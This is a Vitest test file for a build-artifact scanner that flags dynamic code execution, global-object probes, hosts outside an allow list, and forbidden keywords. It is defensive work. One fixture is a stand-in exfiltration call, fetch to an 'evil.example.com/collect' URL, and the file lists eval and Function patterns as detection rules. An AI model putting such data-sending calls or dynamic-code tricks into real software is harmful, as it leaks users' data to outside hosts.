import type { ArtifactPolicy } from './artifacts.ts'
import { describe, expect, it } from 'vitest'
import { scanArtifacts } from './artifacts.ts'

const policy: ArtifactPolicy = {
  allowedHosts: { 'www.w3.org': 'SVG 命名空间' },
  globalThisProbeMax: 1,
  forbiddenKeywords: ['univerjs-pro', 'posthog'],
}

function rules(content: string, path = 'assets/index.js'): string[] {
  return scanArtifacts([{ path, content }], policy).violations.map(v => v.rule)
}

describe('US-M1-11 A01 产物扫描', () => {
  it('合规：普通代码与允许的命名空间地址', () => {
    expect(rules('const ns="http://www.w3.org/2000/svg";function evaluate(){return 1}')).toEqual([])
  })

  it.each([
    ['eval(', 'eval("1+1")'],
    ['间接 eval', '(0, eval)("x")'],
    ['new Function', 'new Function("return 1")'],
    ['字符串 Function', 'Function("a","return a")'],
    ['字符串定时器', 'setTimeout("alert(1)", 10)'],
    ['字符串 setInterval', 'setInterval(\'tick()\', 10)'],
    ['WebAssembly', 'WebAssembly.instantiate(bytes)'],
  ])('违规：动态代码（%s）', (_case, code) => {
    expect(rules(code)).toEqual(['artifacts/dynamic-code'])
  })

  it('合规：对象方法名里含 eval、Function 的不算', () => {
    expect(rules('a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x")')).toEqual([])
  })

  it('合规：全局对象探测在允许的次数以内', () => {
    expect(rules('var g=Function("return this")();')).toEqual([])
  })

  it('违规：全局对象探测超过允许的次数', () => {
    expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
  })

  it('违规：出现不在允许清单里的主机', () => {
    expect(rules('fetch("https://evil.example.com/collect?x=1")')).toEqual(['artifacts/host'])
  })

  it('违规：CSS 里的外部地址同样计入', () => {
    expect(rules('body{background:url(https://cdn.example.net/bg.png)}', 'assets/index.css')).toEqual(['artifacts/host'])
  })

  it('违规：出现 Pro 或第三方统计的关键字', () => {
    expect(rules('import("@univerjs-pro/license");posthog.capture()')).toEqual(['artifacts/keyword', 'artifacts/keyword'])
  })

  it('汇总出现过的主机，便于审查允许清单', () => {
    const { hosts } = scanArtifacts([{ path: 'a.js', content: '"http://www.w3.org/1999/xhtml" "http://www.w3.org/2000/svg"' }], policy)
    expect(hosts).toEqual(new Map([['www.w3.org', 2]]))
  })
})
